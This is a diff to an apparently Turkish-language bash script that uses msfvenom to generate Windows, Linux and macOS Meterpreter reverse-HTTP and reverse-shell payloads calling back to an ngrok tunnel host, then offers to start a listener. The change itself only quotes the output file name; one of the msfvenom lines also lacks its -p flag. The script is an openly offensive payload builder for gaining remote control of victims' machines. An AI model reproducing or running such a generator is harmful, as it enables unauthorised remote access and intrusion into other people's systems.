@@ -47,7 +47,7 @@ sleep 0.5
 
 if [ $payload_no = '1' ]; then
     echo "Payload Oluşturuluyor..."
-    msfvenom -p windows/meterpreter/reverse_http lhost=$ngrok_url lport=$payload_port -o /$payload_name
+    msfvenom -p windows/meterpreter/reverse_http lhost=$ngrok_url lport=$payload_port -o "$payload_name"
     echo 
     echo "Payload Oluşturuldu."
     echo "Dinleyiciyi Açmak İster misin ? (e/h)"
@@ -64,7 +64,7 @@ if [ $payload_no = '1' ]; then
 
 elif [ $payload_no = '2' ]; then
     echo "Payload Oluşturuluyor..."
-    msfvenom linux/x86/meterpreter/reverse_http lhost=$ngrok_url lport=$payload_port -o /$payload_name
+    msfvenom linux/x86/meterpreter/reverse_http lhost=$ngrok_url lport=$payload_port -o "$payload_name"
     echo 
     echo "Payload Oluşturuldu."
     echo "Dinleyiciyi Açmak İster misin ? (e/h)"
@@ -81,7 +81,7 @@ elif [ $payload_no = '2' ]; then
 
 elif [ $payload_no = '3' ]; then
     echo "Payload Oluşturuluyor..."
-    msfvenom -p osx/x86/shell_reverse_http lhost=$ngrok_url lport=$payload_port -o /$payload_name
+    msfvenom -p osx/x86/shell_reverse_http lhost=$ngrok_url lport=$payload_port -o "$payload_name"
     echo 
     echo "Payload Oluşturuldu."
     echo "Dinleyiciyi Açmak İster misin ? (e/h)"
